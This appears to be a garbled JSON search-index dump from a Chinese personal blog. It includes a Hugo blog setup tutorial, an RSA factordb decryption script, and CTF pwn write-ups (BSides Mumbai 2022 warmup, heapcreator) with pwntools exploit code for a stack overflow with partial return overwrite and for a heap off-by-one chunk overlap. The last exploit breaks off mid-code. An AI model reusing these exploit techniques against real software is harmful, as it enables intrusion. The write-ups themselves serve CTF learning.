(window.getSelection().anchorNode.parentElement.className == \u0026#34;highlight\u0026#34;) textData = window.getSelection().getRangeAt(0) else textData = window.getSelection().getRangeAt(0) + \u0026#34;\\n\\nè‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚\\n\u0026#34; + \u0026#34;å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚\\n\u0026#34; + \u0026#34;ä½œè€…ï¼šP3troL1er\\né“¾æ¥ï¼šhttps://peterliuzhi.top/\\n\u0026#34;; if (event.clipboardData) { event.clipboardData.setData(\u0026#34;text/html\u0026#34;, htmlData); //setData(å‰ªè´´æ¿æ ¼å¼, æ•°æ®) ç»™å‰ªè´´æ¿èµ‹äºˆæŒ‡å®šæ ¼å¼çš„æ•°æ®ã€‚è¿”å› true è¡¨ç¤ºæ“ä½œæˆåŠŸã€‚ event.clipboardData.setData(\u0026#34;text/plain\u0026#34;, textData); } else if (window.clipboardData) { //window.clipboardDataçš„ä½œç”¨æ˜¯åœ¨é¡µé¢ä¸Šå°†éœ€è¦çš„ä¸œè¥¿å¤åˆ¶åˆ°å‰ªè´´æ¿ä¸Šï¼Œæä¾›äº†å¯¹äºé¢„å®šä¹‰çš„å‰ªè´´æ¿æ ¼å¼çš„è®¿é—®ï¼Œä»¥ä¾¿åœ¨ç¼–è¾‘æ“ä½œä¸­ä½¿ç”¨ã€‚ return window.clipboardData.setData(\u0026#34;text\u0026#34;, textData); } } document.addEventListener(\u0026#34;copy\u0026#34;, function (e) { setClipboardText(e); }); \u0026lt;/script\u0026gt; å¢åŠ å‹é“¾é¡µé¢ æ–°å»ºlayouts/shortcodes/friend.htmlï¼ˆåŒ…æ‹¬æ–‡ä»¶å¤¹ï¼‰ï¼Œå†™å…¥ï¼š\n{{- if .IsNamedParams -}} \u0026lt;a target=\u0026#34;_blank\u0026#34; href={{ .Get \u0026#34;url\u0026#34; }} title={{ .Get \u0026#34;name\u0026#34; }} class=\u0026#34;friendurl\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;frienddiv\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;frienddivleft\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;myfriend\u0026#34; src={{ .Get \u0026#34;logo\u0026#34; }} /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;frienddivright\u0026#34;\u0026gt; \u0026lt;b\u0026gt; \u0026lt;div class=\u0026#34;friendname\u0026#34;\u0026gt;{{- .Get \u0026#34;name\u0026#34; -}}\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;friendinfo\u0026#34;\u0026gt;{{- .Get \u0026#34;word\u0026#34; -}}\u0026lt;/div\u0026gt; \u0026lt;/b\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; {{- end }} ç„¶åæ–°å»ºcontent/friend/links.mdå†™å…¥ï¼š\n--- title: Links reprint: true date: 2023-01-19T21:51:25+08:00 --- \u0026lt;style\u0026gt; .friendurl { text-decoration: none !important; color: black; box-shadow: none !important; } .myfriend { width: 56px !important; height: 56px !important; border-radius: 50%!important; padding: 2px; margin-top: 20px !important; margin-left: 14px !important; background-color: transparent; } .frienddiv { overflow: auto; height: 100px; width: 49%; display: inline-block !important; border-radius: 5px; border-width: 0 !important; border-color: transparent !important; -moz-box-shadow: 0 1px 6px rgba(0, 0, 0, .12); -webkit-box-shadow: 0 1px 6px rgba(0, 0, 0, .12); box-shadow: 0 1px 6px rgba(0, 0, 0, .12); background: none; overflow:hidden; -webkit-transition: all ease-out 1s; -moz-transition: all ease-out 1s; -o-transition: all ease-out 1s; transition: all ease-out 1s; } .dark .frienddiv{ -moz-box-shadow: 0 1px 6px rgba(255, 255, 255, 0.12) !important; -webkit-box-shadow: 0 1px 6px rgba(255, 255, 255, 0.12) !important; box-shadow: 0 1px 6px rgba(255, 255, 255, 0.12) !important; } .dark .frienddiv:hover { background: var(--code-bg); } .frienddiv:hover { background: var(--theme); transition: transform 1s; webkit-transform: scale(1.1); -moz-transform: scale(1.2); -ms-transform: scale(1.2); -o-transform: scale(1.2); transform: scale(1.1); } .frienddiv:hover .frienddivleft img { transition: 0.9s !important; -webkit-transition: 0.9s !important; -moz-transition: 0.9s !important; -o-transition: 0.9s !important; -ms-transition: 0.9s !important; transform: rotate(360deg) !important; -webkit-transform: rotate(360deg) !important; -moz-transform: rotate(360deg) !important; -o-transform: rotate(360deg) !important; -ms-transform: rotate(360deg) !important; } .frienddivleft { width: 92px; float: left; margin-right: -5px; } .frienddivright { margin-top: 18px; margin-right: 18px; } .friendname { text-overflow: ellipsis; } .dark .friendname,.dark .friendinfo{ color: white; } .friendinfo { text-overflow: ellipsis; } @media screen and (max-width: 600px) { .friendinfo { display: none; } .frienddivleft { width: 84px; margin: auto; } .frienddivright { height: 100%; margin: auto; display: flex; align-items: center; justify-content: center; } .friendname { font-size: 18px; } } \u0026lt;/style\u0026gt; \u0026lt;!-- è®°å¾—æŠŠ\u0026#34;\\\u0026#34;åˆ æ‰ï¼Œå› ä¸ºhugoçš„shortcodeçš„åŸå› ä¸èƒ½ç›´æ¥æ‰“ä¸¤ä¸ª{ --\u0026gt; \\{\\{\u0026lt; friend name=\u0026#34;P3troL1erçš„åšå®¢\u0026#34; url=\u0026#34;https://peterliuzhi.top/\u0026#34; logo=\u0026#34;https://peterliuzhi.top/images/avatar.png\u0026#34; word=\u0026#34;P3troL1erçš„åšå®¢\u0026#34; \u0026gt;\\}\\} \u0026lt;br\u0026gt;\u0026lt;hr\u0026gt; é¡ºä¾¿ä¸€æï¼Œè®°å¾—ç»™å‹é“¾é¡µé¢è®¾ç½®å…¥å£ï¼Œå¯ä»¥åœ¨menus.yamlè®¾ç½®ï¼š\nmain: - name: Friends url: /friend/links/ weight: 6 æ„Ÿè°¢Hugoåšå®¢æ·»åŠ å‹é“¾ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ä¸­æä¾›çš„ä»£ç \næ·»åŠ åšå®¢ç”Ÿå­˜æ—¶é—´è®¡æ•° æœ€è¿‘çœ‹åˆ°hexoåšå®¢çš„ä¸€ä¸ªä¸»é¢˜æœ‰ä¸€ä¸ªå¾ˆæ£’çš„åŠŸèƒ½ï¼Œä»”ç»†ç ”ç©¶åå‘ç°æ˜¯çº¯ç”±jså®ç°çš„ï¼Œå°±æ‰“ç®—ç»™å®ƒå«–è¿‡æ¥ï¼ˆ\næˆ‘ä»¬åœ¨themes/eureka/layouts/partials/footer.htmlä¸­åŸæœ¬çš„åº•éƒ¨è®°å½•ä¿¡æ¯ä¸‹é¢æ·»åŠ ä¸€å¥html\næ·»åŠ ï¼š\n\u0026lt;p class=\u0026#34;text-sm text-tertiary-text\u0026#34;\u0026gt;æœ¬åšå®¢æœ‰\u0026lt;span id=\u0026#34;since\u0026#34; style=\u0026#34;color: var(--color-eureka);\u0026#34;\u0026gt;0\u0026lt;/span\u0026gt;å¤©çš„å†å²\u0026lt;/p\u0026gt; ç„¶ååœ¨è¿™ä¸ªå…ƒç´ çš„ä¸‹é¢ï¼ˆæ³¨æ„ï¼Œä½ç½®è¦åœ¨å®ƒä¸‹é¢ï¼‰æ·»åŠ ä¸€ä¸ªscriptï¼š\n\u0026lt;script\u0026gt; function show_date_time () { // å¡«å…¥ä½ çš„åšå®¢çš„è¯ç”Ÿæ—¥æœŸï¼Œæ ¼å¼ä¸º æœˆ/æ—¥/å¹´ æ—¶/åˆ†/ç§’ var BirthDay = new Date(\u0026#34;10/26/2022 0:00:00\u0026#34;); var today = new Date(); var timeold = (today.getTime() - BirthDay.getTime()); var msPerDay = 24 * 60 * 60 * 1000 var day = Math.floor(timeold / msPerDay) since.innerHTML = day } show_date_time() \u0026lt;/script\u0026gt; æ”¹ä¸€ä¸‹ä½ çš„åšå®¢çš„è¯ç”Ÿæ—¥æœŸå°±å¯ä»¥å•¦ï¼Œè¿™ä¸ªè„šæœ¬ä¼šæ ¹æ®ç”¨æˆ·æ‰“å¼€ç½‘é¡µçš„æ—¶é—´å®æ—¶æ›´æ–°ç”Ÿå­˜æ—¶é—´ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š\nç›®å‰æ¥è¯´ï¼Œä½œè€…å°±æ·»åŠ äº†è¿™ä¹ˆç‚¹åŠŸèƒ½ï¼Œè¦æ˜¯ä»¥åæ¢ç´¢åˆ°æ›´å¤šæœ‰è¶£çš„åŠŸèƒ½ï¼Œä¼šæ›´æ–°è¿™ç¯‡æ–‡ç« ï¼Œæ‰€ä»¥ï¼Œæ„¿æ„è®¢é˜…æˆ‘çš„åšå®¢å—ï¼Ÿ\n","date":"2023å¹´01æœˆ08æ—¥","permalink":"https://peterliuzhi.top/posts/%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%E6%90%AD%E5%BB%BAhugo%E5%8D%9A%E5%AE%A2/","section":"posts","summary":"Serious sport has nothing to do with fair play. It is bound up with hatred, jealousy, boastfulness, disregard of all rules and sadistic pleasure in witnessing violence. In other words, it is war minus the shooting. â€” George Orwell å®‰è£… hugo hugo ä¸­æ–‡æ–‡æ¡£ åœ¨releases ç•Œé¢ä¸‹è½½ hugo çš„ exe æ–‡ä»¶ï¼ˆwindowså¯ä»¥","tags":["æ‚è°ˆ","hugo","åšå®¢"],"title":"ä¿å§†çº§æ•™ç¨‹â€”â€”æ­å»ºHugoåšå®¢"},{"categories":null,"contents":"","date":"2023å¹´01æœˆ07æ—¥","permalink":"https://peterliuzhi.top/subscribe/subscribe/","section":"subscribe","summary":"","tags":null,"title":"è®¢é˜…"},{"categories":["tricks","scripts"],"contents":" Tragedy is a tool for the living to gain wisdom, not a guide by which to live. â€” Robert F. Kennedy\nfactordb.comçš„åˆ†è§£é€Ÿåº¦å¾ˆå¿«ï¼Œè§£å¯†RSAçš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯èƒ½ä¼šç”¨åˆ°ï¼Œäºæ˜¯æˆ‘å†™äº†ä¸€ä¸ªåŸºç¡€çˆ¬è™«pythonè„šæœ¬ä»factordb.comè¯·æ±‚æ•°æ®å¾—åˆ°på’Œqåæ±‚é€†å¾—åˆ°dè‡ªåŠ¨è§£å¯†cï¼Œè„šæœ¬ä¸æ˜¯å¾ˆä¼˜é›…ï¼Œå¦‚æœæœ‰å¸ˆå‚…èƒ½æ”¹è¿›ï¼Œçƒ¦è¯·å¸ˆå‚…è´´åœ¨è¯„è®ºåŒºé€ ç¦åæ¥äººï¼Œæ„Ÿè°¢æ‚¨\nè„šæœ¬ import re import requests from bs4 import BeautifulSoup import gmpy2 from Crypto.Util.number import * c = 0 n = 0 print(f\u0026#34;[+]n={n}\u0026#34;) p_q = [] # ä¸€èˆ¬æ¥è¯´éœ€è¦ä»£ç†æ‰èƒ½è¿ä¸Šç½‘ç»œï¼Œæœ‰äº›ä»£ç†åŠ é€Ÿå™¨ä¹Ÿä¸ç”¨è¿™æ ·é…ç½® proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://?.?.?.?:?\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://?.?.?.?:?\u0026#34;, } url = \u0026#34;http://factordb.com/index.php?\u0026#34; html_doc = requests.get(url, params={\u0026#34;query\u0026#34;: n}, proxies=proxies) # åˆ›å»ºä¸€ä¸ªBeautifulSoupè§£æå¯¹è±¡ soup = BeautifulSoup(html_doc.text, \u0026#34;html.parser\u0026#34;, from_encoding=\u0026#34;utf-8\u0026#34;) # è·å–æ‰€æœ‰çš„é“¾æ¥ links = soup.find_all(\u0026#39;a\u0026#39;) print(\u0026#34;æ‰€æœ‰çš„é“¾æ¥:\u0026#34;) full_link = [] for link in links: if link is not None \\ and link.get(\u0026#39;href\u0026#39;) is not None \\ and \u0026#34;index.php?id=\u0026#34; in link.get(\u0026#39;href\u0026#39;): full_link.append(f\u0026#34;http://factordb.com/{link.get(\u0026#39;href\u0026#39;)}\u0026#34;) print(full_link[-1]) # ä»é“¾æ¥ä¸­è·å–på’Œq for link in full_link: html_doc = requests.get(link) tmp_soup = BeautifulSoup( html_doc.text, \u0026#34;html.parser\u0026#34;, from_encoding=\u0026#34;utf-8\u0026#34;) content = tmp_soup.select( \u0026#34;body \u0026gt; form \u0026gt; center \u0026gt; input[type=text]:nth-child(1)\u0026#34;) num = int(content[0].get(\u0026#34;value\u0026#34;)) if num != n: p_q.append(num) p, q = p_q print(f\u0026#34;[+]p={p}\u0026#34;) print(f\u0026#34;[+]q={q}\u0026#34;) # æ±‚æ¬§æ‹‰å‡½æ•° phi = (p-1)*(q-1) # æ±‚eçš„é€†d e = 0 d = gmpy2.invert(e, phi) # ç”¨ç§é’¥è§£å¯† m = pow(c, d, n) print(f\u0026#34;[+]å¯¹c={c}çš„è§£å¯†ç»“æœæ˜¯ï¼š\u0026#34;) result = long_to_bytes(m) try: print(result.decode(\u0026#34;UTF-8\u0026#34;)) except Exception as e: print(result) è¿è¡Œç»“æœç¤ºä¾‹ ","date":"2023å¹´01æœˆ06æ—¥","permalink":"https://peterliuzhi.top/tricks/rsa%E5%9F%BA%E7%A1%80%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8factordb.com%E5%88%86%E8%A7%A3n/","section":"tricks","summary":"Tragedy is a tool for the living to gain wisdom, not a guide by which to live. â€” Robert F. Kennedy factordb.comçš„åˆ†è§£é€Ÿåº¦å¾ˆå¿«ï¼Œè§£å¯†RSAçš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯èƒ½ä¼šç”¨åˆ°ï¼Œäºæ˜¯æˆ‘å†™äº†ä¸€ä¸ªåŸºç¡€çˆ¬è™«python","tags":["crypto"],"title":"RSAåŸºç¡€è§£å¯†è„šæœ¬ï¼ˆä½¿ç”¨factordb.comåˆ†è§£nï¼‰"},{"categories":["writeup","BSides Mumbai"],"contents":" When I let go of what I am, I become what I might be. â€” Laozi\né™„ä»¶ç¨‹åº\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºç»™çš„printfæ¥å¾—åˆ°bufçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯æ ˆåœ°å€\nåœ¨vulnå‡½æ•°ä¸­æœ‰ä¸€ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œä½†æ˜¯å®ƒèƒ½æº¢å‡ºçš„é•¿åº¦å¾ˆå¾®å¦™ï¼Œæ²¡æœ‰åŠæ³•ç›´æ¥è°ƒç”¨winå‡½æ•°ï¼Œå› ä¸ºwinå‡½æ•°è¦æ±‚å¤šä¸ªå‚æ•°ï¼š\nä½†æˆ‘ä»¬çŸ¥é“ï¼Œè™½ç„¶64ä½ç³»ç»Ÿçš„å‡½æ•°è°ƒç”¨çš„å‰å…­ä¸ªå‚æ•°æ˜¯ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­çš„ï¼Œä½†æ˜¯æˆ‘ä»¬çœ‹winå‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼Œæœ€åè¿˜æ˜¯è¦è¯»åˆ°æ ˆä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆå°†ä¸‰ä¸ªå‚æ•°å®‰æ’åœ¨æ ˆä¸­ï¼ŒåŒæ—¶æ§åˆ¶rbpçš„å€¼ï¼Œè·³è¿‡å°†å‚æ•°è¯»å…¥åˆ°æ ˆä¸­çš„è¿‡ç¨‹ï¼š\nä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬åªèƒ½è¯»å…¥0x2Cä¸ªå­—èŠ‚ï¼ŒåŒæ—¶å› ä¸ºPIEçš„å­˜åœ¨ï¼Œæˆ‘ä»¬ä¸çŸ¥é“winå‡½æ•°çš„å®é™…åœ°å€ï¼Œè¿™è¯¥æ€ä¹ˆåœ¨vulnå‡½æ•°ä¸­è½¬å…¥winå‡½æ•°ï¼Ÿ\næˆ‘ä»¬è°ƒè¯•å‘ç°ï¼Œvulnå‡½æ•°åŸæœ¬çš„è¿”å›åœ°å€æ˜¯main+104ï¼Œè€Œwinå‡½æ•°æ°å¥½åœ¨mainä¸‹é¢ï¼š\nåˆå› ä¸ºé¡µæœºåˆ¶çš„å­˜åœ¨ï¼Œå‡½æ•°åœ°å€çš„æœ€åä¸‰ä½æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ›´æ”¹æœ€åä¸€ä¸ªå­—èŠ‚å°±å¥½\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./BSides-chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;1337\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;34.70.253.176\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x1320) b* $rebase(0x131A) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... sendline_after_clean() stack = recv_and_transform(\u0026#34;0x\u0026#34;, from_bytes=False, bound=\u0026#34;\\n\u0026#34;) suclog( stack=stack ) payload = flat([ stack, p32(11534522) + p32(1590475454) ]).ljust(0x20, b\u0026#34;\\x00\u0026#34;) + flat([ stack - 38, p8(0x8E) ]) send_after_clean(payload) interactive_after_clean(no_show=False) ","date":"2023å¹´01æœˆ04æ—¥","permalink":"https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/","section":"writeup","summary":"When I let go of what I am, I become what I might be. â€” Laozi é™„ä»¶ç¨‹åº checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºç»™çš„printfæ¥å¾—åˆ°bufçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯æ ˆåœ°å€","tags":["pwn"],"title":"ã€BSides Mumbai 2022 PWNã€‘Warmup"},{"categories":["writeup"],"contents":" No man is free who is not master of himself. â€” Epictetus\nåŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  create_heap åˆ†é…çš„chunkç»“æ„ä½“åŒ…æ‹¬ä¸€ä¸ªä¿å­˜sizeçš„intï¼Œå’Œä¸€ä¸ªæŒ‡å‘å…¶ä»–å†…å­˜çš„æŒ‡é’ˆï¼š\nå…¶ä¸­ç¬¬äºŒä¸ªchunkçš„å¤§å°æ˜¯ä»»æ„çš„ï¼Œè¿™ä¸Šé¢å°±å¯ä»¥åšæ–‡ç« \nedit_heap æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæœ€åè¯»å–åˆ°çš„å†…å®¹ä¼šæ¯”ä¿å­˜çš„å¤§å°å¤š1ï¼š\nå¦‚æœæˆ‘ä»¬åˆ†é…çš„å¤§å°åˆšåˆšå¥½æ¶µç›–äº†prev_sizeè¿™ä¸ªåŸŸï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„è¾“å…¥å°±å¯ä»¥æ›´æ”¹ä¸‹ä¸€ä¸ªchunkçš„sizeåŸŸ\nshow_heap çœ‹åˆ°è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬é©¬ä¸Šæƒ³åˆ°ï¼Œå¦‚æœå°†heaparray[v1]-\u0026gt;ptræ”¹æˆæŸä¸ªå‡½æ•°çš„gotå€¼ï¼Œå°±å¯ä»¥æ³„éœ²å‡ºlibcåŸºå€\ndelete_heap è¿™ä¸ªå‡½æ•°åœ¨é‡Šæ”¾åä¼šå°†æŒ‡é’ˆå½’é›¶ï¼Œå› æ­¤ç”¨ä¸äº†UAF\nå¤§è‡´æ€è·¯ è¿™é“é¢˜çš„å…³é”®æ˜¯æˆ‘ä»¬è¦è·å¾—æ›´æ”¹heaparray[v1]-\u0026gt;ptrè¿™ä¸ªæŒ‡é’ˆçš„èƒ½åŠ›ï¼Œè€Œæ˜¾è€Œæ˜“è§çš„ï¼Œæœ€æ˜æ˜¾çš„æº¢å‡ºæ¼æ´åœ¨edit_heapé‚£é‡Œæœ‰ä¸€ä¸ªoff by oneæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹ä¸‹ä¸€ä¸ªchunkçš„sizeåŸŸï¼Œè®©å®ƒè¦†ç›–æ‰ä¸‹é¢å‡ ä¸ªchunkï¼Œè¿™æ ·é‡Šæ”¾åå†åˆ†é…çš„æ—¶å€™å°±èƒ½è·å¾—æ›´æ”¹è¢«è¦†ç›–çš„chunkçš„æƒåˆ©\nchunk overlap æ›´å¤šé˜…è¯»ï¼šChunk Extend and Overlapping - CTF Wiki\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬è¾“å…¥çš„sizeæ˜¯0x18ï¼Œä½†æ˜¯ç”±äºsizeä½çš„å­˜åœ¨ï¼Œæœ€ååˆ†é…å¾—åˆ°çš„chunkå¤§å°æ˜¯0x20\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./heapcreator\u0026#34; libc_name: str = \u0026#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_64.so\u0026#34; port: str = \u0026#34;26654\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: 